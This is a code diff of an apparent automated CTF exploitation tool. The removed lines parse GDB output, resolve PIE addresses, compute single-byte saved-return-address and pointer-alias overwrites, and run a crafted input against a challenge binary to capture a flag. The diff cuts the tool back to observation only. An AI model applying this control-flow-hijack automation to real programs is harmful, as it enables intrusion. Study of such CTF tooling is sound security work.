@@ -428,78 +428,36 @@ quit
             "saved_lr_address": (
                 r"CYBERAI_SAVED_LR_ADDR=(0x[0-9a-fA-F]+)"
             ),
-            "saved_lr": (
-                r"CYBERAI_SAVED_LR=(0x[0-9a-fA-F]+)"
-            ),
-            "balance_slot": (
-                r"CYBERAI_ADDR_BALANCE=(0x[0-9a-fA-F]+)"
-            ),
-            "wager_slot": (
-                r"CYBERAI_ADDR_WAGER=(0x[0-9a-fA-F]+)"
-            ),
-            "addr_slot": (
-                r"CYBERAI_ADDR_ADDR=(0x[0-9a-fA-F]+)"
-            ),
-            "value_slot": (
-                r"CYBERAI_ADDR_VALUE=(0x[0-9a-fA-F]+)"
-            ),
-            "balance": (
-                r"CYBERAI_BALANCE_PTR=(0x[0-9a-fA-F]+)"
-            ),
-            "runtime_game": (
-                r"CYBERAI_RUNTIME_GAME=(0x[0-9a-fA-F]+)"
-            ),
         }
 
         for key, pattern in patterns.items():
             match = re.search(pattern, text)
-            if not match:
-                continue
 
-            value = self.parse_int(match.group(1))
-            if value is not None:
-                state[key] = value
-
-        # Fallback: GDB's "game (balance=...)" line.
-        if "balance" not in state:
-            match = re.search(
-                r"game\s*\(balance=(0x[0-9a-fA-F]+)\)",
-                text,
-            )
             if match:
                 value = self.parse_int(match.group(1))
-                if value is not None:
-                    state["balance"] = value
 
-        # Fallback for saved LR if the explicit marker is unavailable.
-        if "saved_lr" not in state:
-            saved_match = re.search(
-                r"0x[0-9a-fA-F]+:\s+"
-                r"(0x[0-9a-fA-F]+)",
-                text,
-            )
-            if saved_match:
-                value = self.parse_int(saved_match.group(1))
                 if value is not None:
-                    state["saved_lr"] = value
+                    state[key] = value
 
-        # Extract the runtime address reported by:
-        #   Symbol "game" is a function at address 0x...
-        symbol_match = re.search(
-            r'Symbol\s+"'
-            + re.escape("game")
-            + r'"\s+is a function at address\s+'
+        # First hexadecimal value printed after x/gx is normally
+        # the saved LR value.
+        saved_match = re.search(
+            r"0x[0-9a-fA-F]+:\s+"
             r"(0x[0-9a-fA-F]+)",
             text,
         )
 
-        if symbol_match:
-            value = self.parse_int(symbol_match.group(1))
-            if value is not None:
-                state["runtime_game_symbol"] = value
+        if saved_match:
+            value = self.parse_int(saved_match.group(1))
 
-        # Keep GDB return code if the caller injected it.
+            if value is not None:
+                state["saved_lr"] = value
+
         return state
+
+    # ------------------------------------------------------------------
+    # Same-inferior runtime discovery
+    # ------------------------------------------------------------------
 
     def discover_runtime_state(
         self,
@@ -669,259 +627,53 @@ quit
         candidates: list[dict[str, Any]] = []
 
         saved_lr = state.get("saved_lr")
-        saved_lr_address = state.get("saved_lr_address")
-        runtime_game = state.get("runtime_game")
-        runtime_game_symbol = state.get("runtime_game_symbol")
+        saved_lr_address = state.get(
+            "saved_lr_address"
+        )
 
         if saved_lr is None or saved_lr_address is None:
             return candidates
 
-        # ----------------------------------------------------------
-        # Resolve static game address directly from nm
-        # ----------------------------------------------------------
-
-        static_game = None
-
-        try:
-            proc = subprocess.run(
-                ["nm", "-an", self.binary],
-                text=True,
-                capture_output=True,
-                check=False,
-                timeout=5,
-            )
-
-            nm_game_re = re.compile(
-                r"^\s*([0-9a-fA-F]+)\s+[A-Za-z]\s+game\s*$"
-            )
-
-            for line in proc.stdout.splitlines():
-                match = nm_game_re.match(line)
-                if match:
-                    static_game = int(match.group(1), 16)
-                    break
-
-        except Exception:
-            static_game = None
-
-        # GDB's explicit runtime function address is preferred.
-        runtime_game_address = (
-            runtime_game_symbol
-            if runtime_game_symbol is not None
-            else runtime_game
-        )
-
-        pie_base = None
-
-        if (
-            static_game is not None
-            and runtime_game_address is not None
-        ):
-            pie_base = runtime_game_address - static_game
-
-            # PIE base should be page aligned.
-            if pie_base < 0 or pie_base & 0xfff:
-                pie_base = None
-
-        self.result.setdefault("metadata", {})
-
-        self.result["metadata"]["pie"] = {
-            "static_game": (
-                hex(static_game)
-                if static_game is not None
-                else None
-            ),
-            "runtime_game": (
-                hex(runtime_game_address)
-                if runtime_game_address is not None
-                else None
-            ),
-            "base": (
-                hex(pie_base)
-                if pie_base is not None
-                else None
-            ),
-        }
-
-        # ----------------------------------------------------------
-        # Resolve every target from static -> runtime
-        # ----------------------------------------------------------
-
-        resolved_targets = []
-
         for target in targets:
-            target_static = int(target.address)
+            target_runtime = target.address
 
-            if pie_base is not None:
-                target_runtime = pie_base + target_static
-            else:
-                target_runtime = target_static
-
-            resolved_targets.append(
-                {
-                    "name": target.name,
-                    "static": target_static,
-                    "runtime": target_runtime,
-                }
-            )
-
-        self.result["metadata"]["runtime_targets"] = [
-            {
-                "name": item["name"],
-                "static": hex(item["static"]),
-                "runtime": hex(item["runtime"]),
-            }
-            for item in resolved_targets
-        ]
-
-        # ----------------------------------------------------------
-        # Saved LR -> target analysis
-        # ----------------------------------------------------------
-
-        for target in resolved_targets:
-            target_runtime = target["runtime"]
-
-            delta = self.byte_delta(
-                saved_lr,
-                target_runtime,
-            )
-
+            # PIE runtime addresses cannot be used directly from nm.
+            # A target with a known static symbol is only a semantic
+            # candidate until its runtime address is observed.
             candidate = {
                 "strategy": "saved_lr_byte_redirect",
-                "target": target["name"],
-                "target_static": hex(target["static"]),
-                "target_runtime": hex(target_runtime),
+                "target": target.name,
+                "target_static": hex(target.address),
                 "saved_lr": hex(saved_lr),
-                "saved_lr_address": hex(saved_lr_address),
-                "byte_delta": delta,
+                "saved_lr_address": hex(
+                    saved_lr_address
+                ),
+                "byte_delta": self.byte_delta(
+                    saved_lr,
+                    target_runtime,
+                ),
                 "validated": False,
-                "feasible_single_byte": len(delta) == 1,
             }
-
-            if len(delta) == 1:
-                candidate.update(
-                    {
-                        "write_byte": delta[0]["byte"],
-                        "write_before": delta[0]["before"],
-                        "write_after": delta[0]["after"],
-                    }
-                )
 
             candidates.append(candidate)
 
-        # ----------------------------------------------------------
-        # Pointer alias analysis
-        # ----------------------------------------------------------
-
-        balance_slot = state.get("balance_slot")
-        balance_ptr = state.get("balance")
-        wager_slot = state.get("wager_slot")
-        addr_slot = state.get("addr_slot")
-        value_slot = state.get("value_slot")
-
-        if (
-            balance_slot is not None
-            and balance_ptr is not None
-        ):
-            alias_delta = self.byte_delta(
-                balance_ptr,
-                saved_lr_address,
-            )
-
-            alias_candidate = {
+        # Pointer-redirection candidate.
+        candidates.append(
+            {
                 "strategy": "pointer_alias_saved_lr",
-                "balance_slot": hex(balance_slot),
-                "balance_current": hex(balance_ptr),
-                "saved_lr_address": hex(saved_lr_address),
-                "byte_delta": alias_delta,
+                "saved_lr_address": hex(
+                    saved_lr_address
+                ),
+                "saved_lr": hex(saved_lr),
                 "validated": False,
-                "feasible_single_byte": len(alias_delta) == 1,
             }
-
-            if len(alias_delta) == 1:
-                alias_candidate.update(
-                    {
-                        "write_byte": alias_delta[0]["byte"],
-                        "write_before": alias_delta[0]["before"],
-                        "write_after": alias_delta[0]["after"],
-                    }
-                )
-
-            if wager_slot is not None:
-                alias_candidate["wager_slot"] = hex(wager_slot)
-
-            if addr_slot is not None:
-                alias_candidate["addr_slot"] = hex(addr_slot)
-
-            if value_slot is not None:
-                alias_candidate["value_slot"] = hex(value_slot)
-
-            candidates.append(alias_candidate)
-
-        # ----------------------------------------------------------
-        # Arithmetic transformation through *balance
-        # ----------------------------------------------------------
-
-        arithmetic_targets = []
-
-        if (
-            balance_ptr is not None
-            and len(
-                self.byte_delta(
-                    balance_ptr,
-                    saved_lr_address,
-                )
-            ) == 1
-        ):
-            saved_lr_low32 = saved_lr & 0xffffffff
-
-            for target in resolved_targets:
-                target_low32 = target["runtime"] & 0xffffffff
-
-                wager = (
-                    saved_lr_low32 - target_low32
-                ) & 0xffffffff
-
-                if wager <= 0x7fffffff:
-                    arithmetic_targets.append(
-                        {
-                            "target": target["name"],
-                            "target_runtime": hex(
-                                target["runtime"]
-                            ),
-                            "saved_lr_low32": hex(
-                                saved_lr_low32
-                            ),
-                            "target_low32": hex(
-                                target_low32
-                            ),
-                            "wager": wager,
-                            "wager_hex": hex(wager),
-                            "signed_int_valid": True,
-                        }
-                    )
-
-        if arithmetic_targets:
-            candidates.append(
-                {
-                    "strategy": "pointer_alias_arithmetic",
-                    "balance_slot": (
-                        hex(balance_slot)
-                        if balance_slot is not None
-                        else None
-                    ),
-                    "balance_current": (
-                        hex(balance_ptr)
-                        if balance_ptr is not None
-                        else None
-                    ),
-                    "saved_lr_address": hex(saved_lr_address),
-                    "arithmetic_targets": arithmetic_targets,
-                    "validated": False,
-                }
-            )
+        )
 
         return candidates
+
+    # ------------------------------------------------------------------
+    # Runtime target resolution
+    # ------------------------------------------------------------------
 
     def resolve_runtime_target(
         self,
@@ -1007,250 +759,27 @@ quit
         candidate: dict[str, Any],
     ) -> dict[str, Any]:
         """
-        Execute one controlled runtime experiment.
+        Execute one runtime observation.
 
-        The experiment is derived from runtime evidence and the selected
-        candidate.  No challenge-specific addresses or constants are used.
+        V3 deliberately separates:
+          discovery
+          candidate generation
+          validation
+
+        A candidate is never considered validated solely because
+        static analysis found an interesting address.
         """
 
         result = {
             "id": "pwn-runtime-001",
             "strategy": candidate.get("strategy"),
-            "status": "EXPERIMENT_PLANNED",
+            "status": "RUNTIME_EVIDENCE",
             "validated": False,
             "flag_found": False,
             "flags": [],
             "observations": [],
         }
 
-        strategy = candidate.get("strategy")
-
-        # --------------------------------------------------------------
-        # Generic arithmetic pointer-alias experiment
-        # --------------------------------------------------------------
-        if strategy == "pointer_alias_arithmetic":
-            arithmetic_targets = candidate.get("arithmetic_targets", [])
-
-            valid_targets = [
-                item
-                for item in arithmetic_targets
-                if isinstance(item, dict)
-                and item.get("signed_int_valid") is True
-                and item.get("wager") is not None
-            ]
-
-            if not valid_targets:
-                result["status"] = "EXPERIMENT_SKIPPED"
-                result["reason"] = (
-                    "No valid arithmetic target was available."
-                )
-                return result
-
-            target = valid_targets[0]
-
-            balance_slot = candidate.get("balance_slot")
-            wager = target.get("wager")
-
-            if balance_slot is None or wager is None:
-                result["status"] = "EXPERIMENT_SKIPPED"
-                result["reason"] = (
-                    "Required runtime values are missing."
-                )
-                return result
-
-            try:
-                balance_slot_int = int(balance_slot, 16)
-                wager_int = int(wager)
-            except (TypeError, ValueError):
-                result["status"] = "EXPERIMENT_SKIPPED"
-                result["reason"] = (
-                    "Runtime candidate values are invalid."
-                )
-                return result
-
-            # The controlled byte write aliases the balance pointer with
-            # the saved return-address location.
-            #
-            # The candidate already contains the byte transformation
-            # discovered dynamically.
-            current_ptr = candidate.get("balance_current")
-            saved_lr_address = candidate.get("saved_lr_address")
-
-            if current_ptr is None or saved_lr_address is None:
-                result["status"] = "EXPERIMENT_SKIPPED"
-                result["reason"] = (
-                    "Pointer-alias runtime evidence is incomplete."
-                )
-                return result
-
-            try:
-                current_ptr_int = int(current_ptr, 16)
-                saved_lr_address_int = int(saved_lr_address, 16)
-            except (TypeError, ValueError):
-                result["status"] = "EXPERIMENT_SKIPPED"
-                result["reason"] = (
-                    "Pointer-alias addresses are invalid."
-                )
-                return result
-
-            deltas = self.byte_delta(
-                current_ptr_int,
-                saved_lr_address_int,
-            )
-
-            if len(deltas) != 1:
-                result["status"] = "EXPERIMENT_SKIPPED"
-                result["reason"] = (
-                    "Pointer alias is not a single-byte transformation."
-                )
-                return result
-
-            write_byte = deltas[0]["after"]
-
-            if not 0 <= write_byte <= 0xff:
-                result["status"] = "EXPERIMENT_SKIPPED"
-                result["reason"] = "Computed byte value is invalid."
-                return result
-
-            if wager_int < 0 or wager_int > 0x7fffffff:
-                result["status"] = "EXPERIMENT_SKIPPED"
-                result["reason"] = "Computed wager is not a valid signed int."
-                return result
-
-            # The first input selects the stack slot containing `balance`.
-            # The second input changes its low byte so that the pointer
-            # aliases the saved LR.
-            #
-            # The initial name length is deliberately small and does not
-            # participate in exploitation.
-            experiment_input = (
-                f"1\n"
-                f"{balance_slot_int:x}\n"
-                f"{write_byte}\n"
-                f"{wager_int}\n"
-                f"0\n"
-            )
-
-            result["experiment"] = {
-                "function": function,
-                "target": target.get("target"),
-                "target_runtime": target.get("target_runtime"),
-                "balance_slot": hex(balance_slot_int),
-                "saved_lr_address": hex(saved_lr_address_int),
-                "write_byte": write_byte,
-                "wager": wager_int,
-                "input": experiment_input,
-            }
-
-            self.observe(
-                "EXPERIMENT_PLANNED",
-                0.70,
-                "Generated a runtime experiment from the discovered "
-                "pointer-alias arithmetic primitive.",
-                result["experiment"],
-            )
-
-            # ----------------------------------------------------------
-            # Execute a fresh inferior.
-            #
-            # GDB uses disable-randomization, matching runtime discovery,
-            # so dynamically discovered stack addresses remain stable
-            # between the observation and experiment processes.
-            # ----------------------------------------------------------
-            gdb_script = f"""
-set pagination off
-set confirm off
-set disable-randomization on
-file {self.binary}
-run < /tmp/cyberai_pwn_experiment_input
-"""
-
-            try:
-                with open(
-                    "/tmp/cyberai_pwn_experiment_input",
-                    "w",
-                    encoding="utf-8",
-                ) as input_file:
-                    input_file.write(experiment_input)
-
-                proc = subprocess.run(
-                    [
-                        self.gdb_path,
-                        "-q",
-                        "-batch",
-                        "-ex", "set pagination off",
-                        "-ex", "set confirm off",
-                        "-ex", "set disable-randomization on",
-                        "-ex", f"file {self.binary}",
-                        "-ex", "run < /tmp/cyberai_pwn_experiment_input",
-                    ],
-                    text=True,
-                    capture_output=True,
-                    timeout=15,
-                )
-
-                output = (proc.stdout or "") + (proc.stderr or "")
-
-                result["experiment"]["returncode"] = proc.returncode
-                result["experiment"]["output"] = output
-
-                flags = self.detect_flags(output)
-
-                if flags:
-                    result["flags"] = flags
-                    result["flag_found"] = True
-
-                # A successful control-flow transfer normally causes the
-                # target function to print the flag.  Keep validation
-                # conservative: require an observed flag.
-                if result["flag_found"]:
-                    result["status"] = "VALIDATED"
-                    result["validated"] = True
-                    result["observations"].append({
-                        "status": "VALIDATED",
-                        "target": target.get("target"),
-                        "flags": flags,
-                    })
-
-                    self.observe(
-                        "VALIDATED",
-                        0.99,
-                        "Runtime experiment produced a flag.",
-                        {
-                            "target": target.get("target"),
-                            "flags": flags,
-                        },
-                    )
-                else:
-                    result["status"] = "EXPERIMENT_EXECUTED"
-                    result["observations"].append({
-                        "status": "EXPERIMENT_EXECUTED",
-                        "returncode": proc.returncode,
-                    })
-
-                    self.observe(
-                        "EXPERIMENT_EXECUTED",
-                        0.75,
-                        "Runtime experiment executed without "
-                        "observing a flag.",
-                        {
-                            "returncode": proc.returncode,
-                        },
-                    )
-
-            except subprocess.TimeoutExpired:
-                result["status"] = "EXPERIMENT_TIMEOUT"
-                result["reason"] = "Runtime experiment timed out."
-
-            except Exception as exc:
-                result["status"] = "EXPERIMENT_ERROR"
-                result["reason"] = str(exc)
-
-            return result
-
-        # --------------------------------------------------------------
-        # Other candidates remain observation-only for now.
-        # --------------------------------------------------------------
         self.observe(
             "RUNTIME_EVIDENCE",
             0.55,
@@ -1260,10 +789,12 @@ run < /tmp/cyberai_pwn_experiment_input
             },
         )
 
-        result["observations"].append({
-            "status": "RUNTIME_EVIDENCE",
-            "candidate": candidate,
-        })
+        result["observations"].append(
+            {
+                "status": "RUNTIME_EVIDENCE",
+                "candidate": candidate,
+            }
+        )
 
         return result
 
@@ -1316,62 +847,7 @@ run < /tmp/cyberai_pwn_experiment_input
 
         # At this stage we intentionally do NOT call a target function
         # and do NOT claim exploitation success.
-        #
-        # Rank candidates by generic exploitability instead of relying
-        # on candidate generation order.
-        def candidate_rank(candidate):
-            score = 0
-
-            if candidate.get("validated") is True:
-                score += 100000
-
-            arithmetic_targets = candidate.get("arithmetic_targets")
-            if isinstance(arithmetic_targets, list) and arithmetic_targets:
-                score += 10000
-
-                valid_arithmetic = [
-                    item for item in arithmetic_targets
-                    if isinstance(item, dict)
-                    and item.get("signed_int_valid") is True
-                    and item.get("wager") is not None
-                ]
-
-                if valid_arithmetic:
-                    score += 5000
-
-            if candidate.get("feasible_single_byte") is True:
-                score += 1000
-
-            if candidate.get("feasible_single_byte") is False:
-                score -= 1000
-
-            if candidate.get("target") is not None:
-                score += 100
-
-            return score
-
-        ranked_candidates = sorted(
-            candidates,
-            key=candidate_rank,
-            reverse=True,
-        )
-
-        self.result["candidate_ranking"] = [
-            {
-                "strategy": c.get("strategy"),
-                "score": candidate_rank(c),
-                "validated": c.get("validated"),
-                "feasible_single_byte": c.get("feasible_single_byte"),
-                "arithmetic_targets": len(
-                    c.get("arithmetic_targets", [])
-                )
-                if isinstance(c.get("arithmetic_targets"), list)
-                else 0,
-            }
-            for c in ranked_candidates
-        ]
-
-        candidate = ranked_candidates[0]
+        candidate = candidates[0]
 
         self.result["candidate"] = candidate
         self.result["strategy"] = candidate.get(
